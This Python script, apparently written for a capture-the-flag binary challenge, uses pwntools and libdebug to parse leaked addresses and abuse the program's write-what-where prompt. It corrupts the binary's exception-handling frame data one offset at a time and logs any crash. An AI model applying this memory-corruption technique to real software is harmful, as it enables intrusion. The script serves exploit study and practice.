from pwn import *
from libdebug import debugger
import sys


def run_once(offset, data):

    d = debugger("./handout/challenge")
    got_segv = False

    binary_base = None
    libc_base = None

    def catcher_segv(thread, catcher):
        rip = thread.regs.rip
        print(f"SEGV: {offset:#x} rip= {rip:#x} {rip-libc_base:#x}")
        got_segv = True
        #print(thread.regs['rip'])

    r = d.run()

    d.catch_signal("SIGSEGV", callback=catcher_segv)

    d.cont()

    r.recvuntil(b"main: ")
    main = int(r.recvuntil(b"\n")[:-1], 16)
    r.recvuntil(b"var: ")
    var = int(r.recvuntil(b"\n")[:-1], 16)
    r.recvuntil(b"printf: ")
    printf = int(r.recvuntil(b"\n")[:-1], 16)

    binary_base = main - 0x14ee
    libc_base = printf - 0x4606f0

    #print(f"{main=:#x}")
    #print(f"{var=:#x}")
    #print(f"{printf=:#x}")

    #print(f"{binary_base=:#x}")
    #print(f"{libc_base=:#x}")


    eh_start = binary_base + 0x20b0
    eh_end = binary_base + 0x22a4

    addr = eh_start + offset
    val = u64(data)

    r.recvuntil(b"Where to write?")
    r.sendline(f"{addr:#x}".encode())

    r.recvuntil(b"What to write?")
    r.sendline(f"{val:#x}".encode())

    r.recvuntil(b"Write again?")
    r.sendline(f"0".encode())

    d.wait()


orig_conts=b'''\x01\x1b\x03;T\x00\x00\x00\t\x00\x00\x00p\xef\xff\xff\x88\x00\x00\x000\xf0\xff\xff\xb0\x00\x00\x00P\xf0\xff\xff\xc8\x00\x00\x00\x00\xf1\xff\xffp\x00\x00\x00\xe9\xf1\xff\xffD\x01\x00\x000\xf2\xff\xffd\x01\x00\x00>\xf4\xff\xff\x88\x01\x00\x00\xd8\xf4\xff\xff\xe0\x00\x00\x00\xfa\xf4\xff\xff \x01\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x01zR\x00\x01x\x10\x01\x1b\x0c\x07\x08\x90\x01\x00\x00\x14\x00\x00\x00\x1c\x00\x00\x00\x88\xf0\xff\xff&\x00\x00\x00\x00D\x07\x10\x00\x00\x00\x00$\x00\x00\x004\x00\x00\x00\xe0\xee\xff\xff\xc0\x00\x00\x00\x00\x0e\x10F\x0e\x18J\x0f\x0bw\x08\x80\x00?\x1a:*3$\"\x00\x00\x00\x00\x14\x00\x00\x00\\\x00\x00\x00x\xef\xff\xff \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00t\x00\x00\x00\x80\xef\xff\xff\xb0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x8c\x00\x00\x00\xf0\xf3\xff\xff\"\x00\x00\x00\x00E\x0e\x10\x86\x02C\r\x06Y\x0c\x07\x08\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x01zPLR\x00\x01x\x10\x07\x9bU\x1e\x00\x00\x1b\x1b\x0c\x07\x08\x90\x01\x00\x00 \x00\x00\x00$\x00\x00\x00\xd2\xf3\xff\xff\"\x00\x00\x00\x04\x83\x00\x00\x00E\x0e\x10\x86\x02C\r\x06Y\x0c\x07\x08\x00\x00\x00\x1c\x00\x00\x00\xf0\x00\x00\x00\x9d\xf0\xff\xffG\x00\x00\x00\x00E\x0e\x10\x86\x02C\r\x06~\x0c\x07\x08\x00\x00\x00 \x00\x00\x00h\x00\x00\x00\xc4\xf0\xff\xff\x0e\x02\x00\x00\x04C\x00\x00\x00E\x0e\x10\x86\x02C\r\x06G\x8c\x03\x83\x04\x00\x00$\x00\x00\x00\x8c\x00\x00\x00\xae\xf2\xff\xff\x99\x00\x00\x00\x04?\x00\x00\x00E\x0e\x10\x86\x02C\r\x06E\x83\x03\x02\x8b\x0c\x07\x08\x00\x00\x00\x00\x00\x00\x00\xff\xff\x01\x00\xff\xff\x01\x1b\x16\x05\x00\x004\xbd\x02\xf0\x03\x00\xb4\x03\x05\xdc\x03\x00\xd7\x03\x05\xf0\x03\x00\x89\x04\x05\x00\x00\x00\xff\x9b\x19\x01\x11\x1d\x05)\x016\x05\x00\x00p\x05|\x00\x8e\x01\x05\x00\x00\x01\x00p\x1d\x00\x00'''


for i in range(0, 0x22a4-0x20b0):
    #print(f"{i:#x}")
    d = orig_conts[i:i+8]
    d = b'\xff' + d[1:]
    run_once(i, d)
